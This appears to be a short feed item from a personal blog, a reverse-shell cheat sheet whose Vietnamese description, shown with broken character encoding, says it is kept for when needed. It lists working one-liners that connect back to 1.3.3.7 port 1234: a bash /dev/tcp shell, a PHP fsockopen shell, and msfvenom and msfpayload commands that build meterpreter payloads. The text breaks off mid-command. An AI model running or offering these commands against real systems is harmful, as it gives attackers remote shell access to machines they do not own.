item.title: Reverse Shell
item.description: Note cho khi cáº§n dÃ¹ng Ä‘áº¿n. Reverse Shell Bash $ bash -i >& /dev/tcp/1.3.3.7/1234 0>&1 $ exec /bin/bash 0&0 2>&0 $ msfvenom -p cmd/unix/reverse_bash LHOST=1.3.3.7 LPORT=1234 -f raw > shell.sh PHP $ php -r '$sock=fsockopen("1.3.3.7",1234);exec("/bin/sh -i <&3 >&3 2>&3");' $sock=fsockopen("1.3.3.7",1234);exec("/bin/sh -i <&3 >&3 2>&3"); $ msfpayload php/meterpreter/reverse_tcp LHOST=1.3.3.7 LPORT=1234 R > exploit.php $ msfvenom -p php/meterpreter_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f raw > shell.php $ cat shell.
